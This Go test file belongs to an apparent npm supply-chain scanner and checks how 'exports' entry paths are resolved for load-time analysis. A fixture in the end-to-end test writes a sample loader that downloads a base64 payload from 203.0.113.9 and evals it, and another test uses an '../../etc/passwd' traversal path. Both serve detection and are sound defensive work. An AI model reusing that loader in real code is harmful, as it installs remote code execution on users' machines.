package npm

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"ihbv.io/depsnort/internal/graph"
)

// D-136: `exports` is the modern replacement for `main` — when present it is
// what Node actually resolves, so a package can ship its entry module, and a
// loader that runs the instant a consumer imports it, without setting `main` at
// all. npmEntryCandidates read only main/module plus the conventional index.*,
// so those packages had no load-time analysis performed on them whatsoever.

func TestD136ExportsEntryPathsShapes(t *testing.T) {
	cases := []struct {
		name string
		raw  string
		want []string
	}{
		{
			name: "string form",
			raw:  `"./dist/index.js"`,
			want: []string{"./dist/index.js"},
		},
		{
			name: "dot subpath",
			raw:  `{".": "./dist/index.js"}`,
			want: []string{"./dist/index.js"},
		},
		{
			// Both arms are collected: either may be the one Node resolves,
			// depending on how the consumer imports. Order follows the sorted
			// CONDITION KEYS ("import" < "require"), not the path strings.
			name: "conditions",
			raw:  `{".": {"import": "./d/i.mjs", "require": "./d/i.cjs"}}`,
			want: []string{"./d/i.mjs", "./d/i.cjs"},
		},
		{
			// A loader behind a secondary subpath executes on import too.
			name: "subpath only, no dot",
			raw:  `{"./feature": "./dist/feature.js"}`,
			want: []string{"./dist/feature.js"},
		},
		{
			name: "fallback array",
			raw:  `{".": ["./a.js", "./b.js"]}`,
			want: []string{"./a.js", "./b.js"},
		},
		{
			name: "nested conditions",
			raw:  `{".": {"node": {"import": "./n.mjs", "default": "./n.js"}}}`,
			want: []string{"./n.js", "./n.mjs"},
		},
		{
			// null blocks a subpath — it names no file.
			name: "null blocks",
			raw:  `{".": "./ok.js", "./private/*": null}`,
			want: []string{"./ok.js"},
		},
		{
			// A wildcard names a SET this static pass cannot enumerate without
			// walking the tree. Skipped, and recorded as a known limitation.
			name: "wildcard skipped",
			raw:  `{".": "./ok.js", "./f/*": "./src/f/*.js"}`,
			want: []string{"./ok.js"},
		},
		{
			// Bare specifiers resolve to other packages, not files here.
			name: "bare specifier skipped",
			raw:  `{".": "./ok.js", "./poly": "node:fs"}`,
			want: []string{"./ok.js"},
		},
		{
			name: "duplicates collapse",
			raw:  `{".": "./x.js", "./alias": "./x.js"}`,
			want: []string{"./x.js"},
		},
		{
			name: "absent",
			raw:  ``,
			want: nil,
		},
		{
			// Malformed exports must not be fatal: main/module and the
			// conventional candidates still apply.
			name: "malformed json",
			raw:  `{"broken": `,
			want: nil,
		},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got := exportsEntryPaths(json.RawMessage(c.raw))
			if len(got) != len(c.want) {
				t.Fatalf("got %v, want %v", got, c.want)
			}
			for i := range got {
				if got[i] != c.want[i] {
					t.Fatalf("got %v, want %v", got, c.want)
				}
			}
		})
	}
}

// TestD136ExportsOrderIsDeterministic guards the sort in exportsEntryPaths. Go
// randomizes map iteration, and these paths become graph node IDs, so an
// unsorted walk would make two scans of the same tree disagree.
func TestD136ExportsOrderIsDeterministic(t *testing.T) {
	raw := json.RawMessage(`{"./e":"./e.js","./a":"./a.js","./c":"./c.js","./b":"./b.js","./d":"./d.js"}`)
	first := exportsEntryPaths(raw)
	if len(first) != 5 {
		t.Fatalf("expected 5 paths, got %v", first)
	}
	for i := 0; i < 50; i++ {
		got := exportsEntryPaths(raw)
		for j := range got {
			if got[j] != first[j] {
				t.Fatalf("iteration %d: order changed: %v vs %v", i, got, first)
			}
		}
	}
}

// TestD136ExportsDepthBounded proves the recursion guard: a deeply nested
// exports value returns rather than exhausting the stack.
func TestD136ExportsDepthBounded(t *testing.T) {
	deep := strings.Repeat(`{"a":`, 5000) + `"./x.js"` + strings.Repeat(`}`, 5000)
	done := make(chan []string, 1)
	go func() { done <- exportsEntryPaths(json.RawMessage(deep)) }()
	got := <-done
	// Past maxExportsDepth nothing is collected; the point is that it returns.
	if len(got) != 0 {
		t.Errorf("expected nothing past the depth bound, got %v", got)
	}
}

// TestD136ExportsEntryCapBounded proves the entry cap holds on a crafted map.
func TestD136ExportsEntryCapBounded(t *testing.T) {
	var b strings.Builder
	b.WriteString("{")
	for i := 0; i < maxExportsEntries*3; i++ {
		if i > 0 {
			b.WriteString(",")
		}
		// Distinct key AND distinct value, so neither dedupe nor key collision
		// is what bounds the result — only the cap.
		b.WriteString(`"./s`)
		b.WriteString(itoa(i))
		b.WriteString(`":"./f`)
		b.WriteString(itoa(i))
		b.WriteString(`.js"`)
	}
	b.WriteString("}")
	got := exportsEntryPaths(json.RawMessage(b.String()))
	if len(got) > maxExportsEntries {
		t.Errorf("entry cap breached: got %d, cap %d", len(got), maxExportsEntries)
	}
	if len(got) == 0 {
		t.Error("expected the cap to bound the result, not empty it")
	}
}

func itoa(i int) string {
	if i == 0 {
		return "0"
	}
	var d []byte
	for i > 0 {
		d = append([]byte{byte('0' + i%10)}, d...)
		i /= 10
	}
	return string(d)
}

// TestD136ExportsTraversalRefused is defense in depth: even if an exports value
// names a path escaping the package, npmEntryCandidates must not emit it. The
// contained reader would refuse the read anyway; this keeps the escape from
// reaching it at all.
func TestD136ExportsTraversalRefused(t *testing.T) {
	m := pkgManifest{Exports: json.RawMessage(`{".": "./../../etc/passwd"}`)}
	for _, c := range npmEntryCandidates(m) {
		if strings.HasPrefix(c, "..") || filepath.IsAbs(c) {
			t.Errorf("traversal candidate emitted: %q", c)
		}
	}
}

// TestD136ExportsOnlyPackageAnalyzedEndToEnd is the regression the fix exists
// for: a package with NO main, exposing its loader only through exports, gets
// load-time analysis. Before the fix this produced no hooks at all.
func TestD136ExportsOnlyPackageAnalyzedEndToEnd(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "package.json",
		`{"name":"ex-pkg","version":"1.0.0","exports":{".":{"import":"./dist/index.mjs"}}}`)
	writeFile(t, dir, "dist/index.mjs", `import https from 'https';
https.get('https://203.0.113.9/stage2', r => {
  let b = ''; r.on('data', d => b += d);
  r.on('end', () => eval(Buffer.from(b, 'base64').toString()));
});`)

	g := graph.New()
	id := "pkg:npm/ex-pkg@1.0.0"
	g.AddNode(&graph.Node{
		ID: id, Kind: graph.KindPackage, Ecosystem: "npm",
		Name: "ex-pkg", Version: "1.0.0", Depth: 0,
		Attr: map[string]string{"npm.source": "package.json"}, // no npm.path
	})
	g.MarkRoot(id)
	if err := (&Adapter{}).ExtractInstallSurface(dir, g); err != nil {
		t.Logf("gaps: %v", err)
	}
	for _, n := range g.SortedNodes() {
		if n.Kind == graph.KindInstallHook && n.Name == "module-load:dist/index.mjs" {
			return
		}
	}
	t.Error("expected module-load:dist/index.mjs for an exports-only package, found none")
}

// TestD136BenignExportsPackageProducesNoHook is the FP boundary: resolving more
// entry paths must not start flagging ordinary libraries. The load-time pass is
// still gated on a JS-precise execution signal.
func TestD136BenignExportsPackageProducesNoHook(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "package.json",
		`{"name":"ex-pkg","version":"1.0.0","exports":{".":"./dist/index.js","./util":"./dist/util.js"}}`)
	writeFile(t, dir, "dist/index.js", "'use strict';\nmodule.exports = { hi: () => 'hi' };")
	writeFile(t, dir, "dist/util.js", "'use strict';\nmodule.exports = { n: 1 };")

	g := graph.New()
	id := "pkg:npm/ex-pkg@1.0.0"
	g.AddNode(&graph.Node{
		ID: id, Kind: graph.KindPackage, Ecosystem: "npm",
		Name: "ex-pkg", Version: "1.0.0", Depth: 0,
		Attr: map[string]string{"npm.source": "package.json"},
	})
	g.MarkRoot(id)
	if err := (&Adapter{}).ExtractInstallSurface(dir, g); err != nil {
		t.Logf("gaps: %v", err)
	}
	for _, n := range g.SortedNodes() {
		if n.Kind == graph.KindInstallHook {
			t.Errorf("did not expect any hook for an ordinary exports package, got %q", n.Name)
		}
	}
}

func writeFile(t *testing.T, dir, rel, content string) {
	t.Helper()
	p := filepath.Join(dir, filepath.FromSlash(rel))
	if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(p, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}
